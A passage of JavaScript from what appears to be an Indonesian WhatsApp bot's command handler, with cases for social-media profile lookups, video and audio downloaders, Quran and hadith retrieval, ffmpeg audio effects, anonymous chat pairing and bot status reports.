                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    zaki.sendMedia(m.chat, anu.caption.profile_hd, '', `➣ Full Name : ${anu.caption.full_name}\n➣ User Name : ${anu.caption.user_name}\n➣ ID ${anu.caption.user_id}\n➣ Followers : ${anu.caption.followers}\n➣ Following : ${anu.caption.following}\n➣ Bussines : ${anu.caption.bussines}\n➣ Profesional : ${anu.caption.profesional}\n➣ Verified : ${anu.caption.verified}\n➣ Private : ${anu.caption.private}\n➣ Bio : ${anu.caption.biography}\n➣ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`➣ Name : ${anu.name}\n➣ Version : ${Object.keys(anu.versions)}\n➣ Created : ${tanggal(anu.time.created)}\n➣ Modified : ${tanggal(anu.time.modified)}\n➣ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n➣ Description : ${anu.description}\n➣ Homepage : ${anu.homepage}\n➣ Keywords : ${anu.keywords}\n➣ Author : ${anu.author.name}\n➣ License : ${anu.license}\n➣ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let tiktokDl = require("hxz-api") 
                if (!text.match(/tiktok/gi)) throw `*Link salah! Perintah ini untuk mengunduh video tiktok dengan link*\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`
                let p = await  tiktokDl.ttdownloader(text)
                const { nowm, wm, audio } = p
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: ' With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: ' Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: nowm },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let tiktokDl = require("hxz-api") 
                if (!text.match(/tiktok/gi)) throw `*Link salah! Perintah ini untuk mengunduh video tiktok dengan link*\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`
                let p = await  tiktokDl.ttdownloader(text)
                const { nowm, wm, audio } = p
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: ' No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: ' Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: wm },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let tiktokDl = require("hxz-api") 
                if (!text.match(/tiktok/gi)) throw `*Link salah! Perintah ini untuk mengunduh video tiktok dengan link*\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`
                let p = await  tiktokDl.ttdownloader(text)
                const { nowm, wm, audio } = p
                let buttonsDl = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: ' No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: ' With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttonsDl,
                    headerType: 2
                }
                let msg = await zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
                zaki.sendMessage(m.chat, { audio: { url: audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
case 'instagram': case 'ig': case 'igdl': {   
let { instagramdl, instagramdlv2 } = require('@bochilteam/scraper')
	        if (!args[0]) throw `*Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`
            if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) throw `*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`
           load(`Loading...`)
            const results = await instagramdl(args[0]).catch(async _ => await instagramdlv2(args[0]))            
            for (let {url} of results)
            await zaki.sendFile(m.chat, url, 'instagram.mp4', `🔗 *Url:* ${await shortlink(url)}`, m)
            
            }
break
	
		/** Backup misal yg atas ga keluar video **/
		
            
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                load(`Loading...`)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await zaki.sendImage(m.chat, anu.result.thumb, `➣ Title : ${anu.result.title}\n➣ Url : ${isUrl(text)[0]}`)
                zaki.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: ' Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: ' Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
                zaki.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                zaki.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `➣ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                load(`Loading...`)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                zaki.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: ' Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: ' Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
➣ Title : ${anu.title}
➣ Author : ${anu.author.name}
➣ Like : ${anu.like}
➣ Caption : ${anu.caption}
➣ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: zaki.user.name,
			buttons,
			headerType: 4
		    }
		    zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        zaki.sendMessage(m.chat, { image: { url }, caption: `➣ Title : ${anu.title}\n➣ Author : ${anu.author.name}\n➣ Like : ${anu.like}\n➣ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		zaki.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		zaki.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break

        case 'mediafire': case 'md':
        if (!text) throw `Linknya mana ?`
        if (!isUrl(args[0]) && !args[0].includes('mediafire')) throw m.reply(mess.error)
       load(`Loading...`)
        if (mediafireDl.size >= 300000) return m.reply(`*Nama :* ${res[0].nama}
        *Ukuran :* ${res[0].size}
        *Link :* ${res[0].link}

        _Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
        load(`Loading...`)
        teks = args.join(' ')
        res = await mediafireDl(teks)
        result = `*Nama :* ${res[0].nama}
        *Ukuran :* ${res[0].size}

        _File sedang dikirim, Silahkan tunggu bebepemuda menit_`
        m.reply(result)
        zaki.sendMessage(m.chat, { document: { url: res[0].link }, mimetype: `${res[0].mime}`, fileName: `${res[0].nama}` }, { quoted: m })     
        break

        case 'zip': case 'zippydl': case 'zippy': case 'zippyshare':
        let zsExtract = require('zs-extract')

        if (!args[0]) throw `Uhm...url nya mana?\n\n *Example:* ${prefix + command} https://www4.zippyshare.com/v/uBGCbNHt/file.html`
        let resk = await zsExtract.extract(args[0])
        let { download, filename } = resk
        m.reply(JSON.stringify(resk, null, 2))
        m.reply('Mohon tunggu selama *5 menit* sedang mendownload file dari _zippyshare_\n\nMinimal File *100MB* jika lebih dari yang ditentukan, Aine tidak akan mengirimkan file..!!')
 

        zaki.sendFile(m.chat, download, filename, filename, m)
        break



		case 'juzamma': {
		if (args[0] === 'pdf') {
		load(`Loading...`)
		zaki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		load(`Loading...`)
		zaki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		load(`Loading...`)
		zaki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		load(`Loading...`)
		zaki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		zaki.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                load(`Loading...`)
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                zaki.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                zaki.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                zaki.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                zaki.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await zaki.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, zaki.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await zaki.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, zaki.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await zaki.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zaki.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await zaki.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zaki.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, zaki.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await zaki.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await zaki.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zaki.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await zaki.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zaki.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, zaki.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                zaki.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break

            case 'self': {
                if (!isCreator) throw mess.owner
                zaki.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
                    case 'bug': case 'report': {
                    	if(!text) throw `Enter The Bug Example\n\n${command} Menu Error `
                    	zaki.sendMessage(`6285770017326@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
Report Message: ${text}` })
m.reply(`Successfully Reported To The Owner\n\nPlease Make Sure The Bug Is Valid, If You Play With This, Use This Feature Again And Again For No Reason, You Will Be Blocked For Sure !`)
                    }
                    break 
case 'tes': case 'test': case 'alive': case 'bot': case 'robot': case 'zaki': case 'doge':{
                anu = `Hi ${pushname} 🤚`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            hydratedContentText: anu,
                            locationMessage: {
                            jpegThumbnail: fs.readFileSync('./media/zaki.jpg')},
                            hydratedFooterText: `𝙸 𝙰𝚖 Yusuf | © 2022`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: 'YouTube',
                                    url: 'https://m.youtube.com/channel/UCHIMODDER'
                                }
                            }, {
                            	urlButton: {
                                displayText: 'Group',
                                    url: 'https://chat.whatsapp.com/FZlu1bLAaoZDaIpPGq7GyS'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Menu',
                                    id: `${prefix}menu`
                                }
                                }, {
                                quickReplyButton: {
                                    displayText: 'Command',
                                    id: `${prefix}allmenu`
                                }
                                }]
                        }
                    }
                }), { userJid: m.chat })
                zaki.relayMessage(m.chat, template.message, { messageId: template.key.id })
                }
break

             case 'sendbuffer':{
try{
 await m.reply('Tunggu sebentar...')
sendFile(m.chat, isUrl(args)[0], mess.done)
} catch (err){
 m.reply(err)
console.log(err)
}
}
break
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
					load(`Loading...`)
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
						zaki.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
